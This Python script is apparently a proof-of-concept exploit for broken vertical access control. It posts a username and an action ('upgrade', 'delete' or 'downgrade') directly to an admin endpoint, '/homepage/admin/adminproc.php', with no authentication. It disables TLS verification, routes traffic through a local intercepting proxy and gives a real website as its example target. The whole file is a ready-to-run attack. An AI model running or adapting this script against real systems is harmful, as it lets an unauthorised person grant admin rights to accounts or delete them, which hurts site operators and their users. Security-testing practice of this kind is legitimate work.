import requests
import sys
import urllib3
import html

proxies = {'http':'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080/'} #debug


def printhelp(name):
    print("Get admin functionality:")
    print("[-] Usage: %s <url> <action> <username>" %name)
    print("""[-] Example: %s "https://www.facebook.com" "upgrade" "somebody" """ %name)
    print("[-] Available functions: upgrade, delete, downgrade")

def exploit_verticle_access_control(url,action,user):
    path = "/homepage/admin/adminproc.php"
    data = {"user": user, "action":action}
    r = requests.post(url+path, data,verify=False, proxies = proxies)
    if r.status_code == 200:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        action = sys.argv[2].strip().lower()
        user = sys.argv[3].strip()
    except IndexError:
        printhelp(sys.argv[0])
        sys.exit(-1)
    
    if exploit_verticle_access_control(url,action,user):
        print("%s is %s"%(user,action))
    else:
        print("%s is failed %s"%(user,action))